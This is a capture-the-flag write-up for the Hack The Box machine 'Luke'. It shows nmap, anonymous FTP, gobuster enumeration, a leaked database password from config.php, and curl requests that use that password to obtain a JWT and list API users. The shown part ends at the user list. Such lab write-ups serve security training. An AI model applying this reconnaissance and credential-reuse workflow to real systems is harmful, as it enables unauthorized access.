<center><h1>Luke</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- On FTP, there is a message hinting that we need a source file for the web application
- By running a gobuster, we can find all the directories and pages
- We use the credentials found to authenticate with the api
- Using the api we can list the credentials for users in plaintext
- Navigating to the /management directory we can log in with one of the users found
- We grab the root password from the config.json file
- Lastly, we log in as root into the Ajenti Admin panel, get a terminal and get the flags
<br><br>

First we start with an nmap scan

```
# Nmap 7.70 scan initiated Sun May 26 22:29:22 2019 as: nmap -sV -sC -T4 -oN LukeNmap 10.10.10.137
Nmap scan report for 10.10.10.137
Host is up (0.087s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 26 22:32:22 2019 -- 1 IP address (1 host up) scanned in 180.36 seconds
```
<br>
So there are a few ports open> First thing I did was check FTP because I saw the Anonymous login was enabled. First thing I noticed was that there was a text file located in <b>webapp/</bold>. I copied the file onto my host machine so that I could read it.
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.

ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.87 secs (0.3433 kB/s)
```
<br>
Reading the file I can see a message that hints towards looking for source files
```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little
push by showing the sources of the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of
our security policies !

Derry  
```
<br>
Now I decide to check out port 80 only to be greeted by a very basic webpage that doesn't give me any useful information.

Now it was time to run a gobuster.
```
gobuster dir -u http://10.10.10.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/16 12:57:24 Starting gobuster
===============================================================
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
```
<br>
Navigating to <b>/config.php</b> we are given some credentials to what looks like a SQL database
```
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword = 'Zk6heYCyv6ZE9Xcg';
$db = "login";
$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```
<br>
Now, going to port 3000 will reveal a NodeJS app running that tells use we need an Auth token. This means that we will have to use JWT tokens

<center><img src="/htb/luke/node.png"></center>
<br>
Running a gobuster on the NodeJS page will reveal some useful directories that are necessary to craft the HTTP request
```
gobuster dir -u http://10.10.10.137:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137:3000
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/16 13:37:26 Starting gobuster
===============================================================
/login (Status: 200)
/users (Status: 200)
/Login (Status: 200)
/Users (Status: 200)
```
<br>

Using *[This article](https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4)*, and the credentials we found earlier I was able to get get an Auth token using curl

```curl -X POST http://10.10.10.137:3000/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}'
```
<br>
If you did everything went right then it should output an Auth token
```
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NjU2MTgwLCJleHAiOjE1Njg3NDI1ODB9.msKF4DP_76XRz5ycCkfP8LjySR8issMSUWbxPF6p97U"}
```
<br>
Now I construct another curl command using the auth token
```
curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NjU2NjM3LCJleHAiOjE1Njg3NDMwMzd9.VEVnCgx1yQrhXDFIHBULGEj8n90nFH5_piQAJYYQkdA' http://10.10.10.137:3000
```
<br>
We get a message that outputs
```
{"message":"Welcome admin ! "}
```
<br>
Now if we send the same request only this time to the users directory we get a list of users
```
curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NjU2NjM3LCJleHAiOjE1Njg3NDMwMzd9.VEVnCgx1yQrhXDFIHBULGEj8n90nFH5_piQAJYYQkdA' http://10.10.10.137:3000
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```
<br>
